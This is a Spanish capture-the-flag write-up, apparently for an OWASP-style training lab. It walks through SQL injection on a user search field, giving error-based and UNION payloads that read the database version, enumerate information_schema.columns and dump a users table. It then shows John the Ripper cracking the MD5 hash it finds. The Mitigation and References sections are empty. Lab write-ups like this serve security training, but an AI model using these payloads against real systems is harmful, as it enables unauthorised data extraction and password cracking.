# Inyección SQL - Usuarios
(owasp)

Misma vulnerabilidad que [la inyección SQL en la vista de imágenes](./sql_injection_images.md).

El ataque de **inyección SQL** consiste en la capacidad de realizar queries diréctamente a la base de datos del servidor mediante la introducción de queries SQL en parámetros de input **no sanitizado**.

## Ataque

En la url de http://<IP>/???, tenemos acceso a un input para buscar usuarios por id, por lo que suponemos que el input de usuario va a formar parte de una query a la base de datos.

Probamos si podemos tener acceso a una vulnerabilidad por mala validación de input; escribimos un `'` y enviamos.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1
```

El servidor no valida la entrada, así que podemos intentar una injección.

Primero, obtenemos la versión de la base de datos del servidor con la siguiente query:

```sql
1 OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1-- -


Duplicate entry '5.5.64-MariaDB-1ubuntu0.14.04.1:1' for key 'group_key'
```
[Fuente: Andvanced SQL Injection Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL-Bypass-Error/README.md)


Tras invesigar esta versión, descubrimos que las versiones mayores de 5.02 de MySQL tienen una base de datos llamadas **INFORMATION_SCHEMA**, que contienen información sobre el resto de bases de datos guardadas en el servidor, lo que nos va a resultar útil en la exploración de la tabla users.

Exploranco [la documentación](https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.html), vemos que information_schema contiene una tabla **columns**, en donde se guardan los nombres de todas las columnas de todas las tablas presentes en la base de datos.

Desde el servidor se escapan los caracteres de comillas, por lo que tendemos que lanzar una query para obtener todas las columnas de todas las tablas.

Como desde el servidor únicamente se recuperan dos columnas para mostrar los parámetros en front, debemos hacer un **union** para concatenar dos columnas con la información que nos interesa.

```sql
1 or 1=1 union select concat_ws(0x2b,table_name,table_schema), column_name from information_schema.columns
```

Y de aquí obtenemos dos columnas interesantes de una tabla **users**.

```
ID: 1 or 1=1 union select concat_ws(0x2b,table_name,table_schema), column_name from information_schema.columns 
First name: users+Member_Sql_Injection
Surname : Commentaire

ID: 1 or 1=1 union select concat_ws(0x2b,table_name,table_schema), column_name from information_schema.columns 
First name: users+Member_Sql_Injection
Surname : countersign
```

Tras obtener los nombres de las columnas de la tabla `users`, sólo nos queda mirar los valores de las columnas sospechosas del usuario Flag.

```sql
420 or 1=1 union select Commentaire, countersign from users
```

Obtenemos lo siguiente:

```
ID: 420 or 1=1 union select Commentaire, countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```
Hacemos lo que nos pide con un john.

```bash
root@f4e2e2e5dc49:/# /john-jumbo/run/john --format=raw-md5 --wordlist=rockme.txt hashes
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Warning: Only 1 candidate buffered, minimum 24 needed for performance.
FortyTwo         (user)
1g 0:00:00:00 DONE (2025-06-15 15:21) 100.0g/s 100.0p/s 100.0c/s 100.0C/s FortyTwo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
root@f4e2e2e5dc49:/# echo -n FortyTwo | sha256sum
9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646  -
```

He aquí la flag.

## Mitigación



## Referencias

